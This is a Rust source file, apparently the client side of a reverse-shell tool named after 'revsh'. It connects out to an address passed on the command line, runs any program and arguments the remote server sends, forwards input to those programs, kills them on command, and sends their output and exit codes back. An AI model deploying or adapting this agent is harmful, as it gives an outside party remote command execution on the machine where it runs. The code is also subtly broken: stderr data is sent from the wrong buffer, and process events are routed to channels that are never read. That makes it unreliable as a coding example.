use anyhow::anyhow;
use serde::{Deserialize, Serialize};
use std::mem::size_of;
use std::net::SocketAddr;
use std::sync::{Arc, Mutex, RwLock};
use std::{io, io::BufRead};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpSocket};
use std::collections::HashMap;
use tokio::process;
use std::process::{ ExitStatus, Stdio };
use std::os::unix::process::ExitStatusExt;
use tokio::sync::{ watch, mpsc, broadcast };

use revsh_common::*;

#[derive(Debug, Clone)]
enum InProcessEvent {
    Exited {
        status_code: ExitStatus,
    },
    Printed {
        data: Box<[u8]>,
    },
}

#[derive(Debug, Clone)]
enum OutProcessEvent {
    Kill,
    SendInput {
        data: Box<[u8]>,
    },
}

#[derive(Debug, Clone)]
struct GlobalEvent {
    sender: UID,
    event: InProcessEvent,
}

struct RunningProcess {
    pid: UID,
    event_sender: mpsc::Sender<OutProcessEvent>,
    event_receiver: mpsc::Receiver<InProcessEvent>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let bjr = std::env::args().nth(1).expect("Missing argument");
    println!("Connecting to {bjr:?}...");

    let socket = TcpSocket::new_v4().unwrap();
    let address: SocketAddr = bjr.parse().unwrap();
    let stream = socket.connect(address.clone()).await?;
    println!("Successfully connected to {:?}!", address);
    
    let (mut reader, mut writer) = stream.into_split();

    let processes = Arc::new(RwLock::new(HashMap::<UID, RunningProcess>::new()));
    let (global_sender, mut global_receiver) = broadcast::channel::<GlobalEvent>(100);

    loop {
        tokio::select! {
            message = recv_message_from(&mut reader) => {
                let mess = message.unwrap();
                match mess {
                    S2CMessage::Execute {
                        pid, exe, args, print_output
                    } => {
                        let (in_send, in_recv) = mpsc::channel(100);
                        let (out_send, out_recv) = mpsc::channel(100);
                        processes.write().unwrap().insert(pid, RunningProcess {
                            pid,
                            event_sender: out_send,
                            event_receiver: in_recv,
                        });

                        tokio::spawn(
                            handle_process(
                                pid, exe, args, print_output,
                                Arc::clone(&processes), global_sender.clone(),
                                in_send, out_recv,
                            )
                        );
                    }
                    S2CMessage::KillProcess { pid } => {
                        let Some(sender) = processes.read().unwrap()
                            .get(&pid).map(|a| a.event_sender.clone()) 
                        else { continue; };
                        
                        sender.send(OutProcessEvent::Kill).await.unwrap();
                    },
                    S2CMessage::Input { target_pid, data } => {
                        let Some(sender) = processes.read().unwrap()
                            .get(&target_pid).map(|a| a.event_sender.clone()) 
                        else { continue; };
                        
                        sender.send(OutProcessEvent::SendInput {
                            data
                        }).await.unwrap();
                    },
                }
            },
            event = global_receiver.recv() => {
                let GlobalEvent { sender: pid, event }= event.unwrap();
                match event {
                    InProcessEvent::Exited { status_code } => {
                        send_message_into(
                            &C2SMessage::ProcessStopped {
                                pid,
                                exit_code: status_code.code().unwrap_or(0),
                            },
                            &mut writer
                        ).await.unwrap();
                    },
                    InProcessEvent::Printed { data } => {
                        send_message_into(
                            &C2SMessage::ProcessOutput {
                                pid, data
                            },
                            &mut writer
                        ).await.unwrap();
                    }
                }
            }
        }
    }
}

async fn handle_process(
    pid: UID, exe: String, args: Vec<String>, print_output: bool,
    processes: Arc<RwLock<HashMap<UID, RunningProcess>>>,
    global_sender: broadcast::Sender<GlobalEvent>,
    mut in_send: mpsc::Sender<InProcessEvent>, mut out_recv: mpsc::Receiver<OutProcessEvent>,
) -> anyhow::Result<()> {
    let mut child = process::Command::new(exe)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;
    let mut stdout = child.stdout.take().unwrap();
    let mut stderr = child.stderr.take().unwrap();
    let mut stdin  = child.stdin.take().unwrap();
    
    let mut read_buf = [0u8; 2048];
    let mut err_buf = [0u8; 2048];
    
    loop {
        tokio::select! {
            exit_code = child.wait() => {
                processes.write().unwrap().remove(&pid);
                in_send.send(InProcessEvent::Exited {
                    status_code: exit_code.unwrap(),
                }).await.unwrap();
                break Ok(());
            },
            Some(out) = out_recv.recv() => {
                match out {
                    OutProcessEvent::Kill => {
                        child.kill().await.expect("No kill");
                        processes.write().unwrap().remove(&pid);
                        in_send.send(InProcessEvent::Exited {
                            status_code: ExitStatus::from_raw(0),
                        }).await.unwrap();
                    }
                    OutProcessEvent::SendInput { data } => {
                        stdin.write_all(&data).await.unwrap();
                    }
                }
            },
            e = stdout.read(&mut read_buf) => {
                let length = e.unwrap();
                if length == 0 {
                    continue;
                }
                
                in_send.send(InProcessEvent::Printed {
                    data: read_buf[0..length].into(),
                }).await.unwrap();
            }
            e = stderr.read(&mut err_buf) => {
                let length = e.unwrap();
                if length == 0 {
                    continue;
                }
                
                in_send.send(InProcessEvent::Printed {
                    data: read_buf[0..length].into(),
                }).await.unwrap();
            }
        }
    }
}
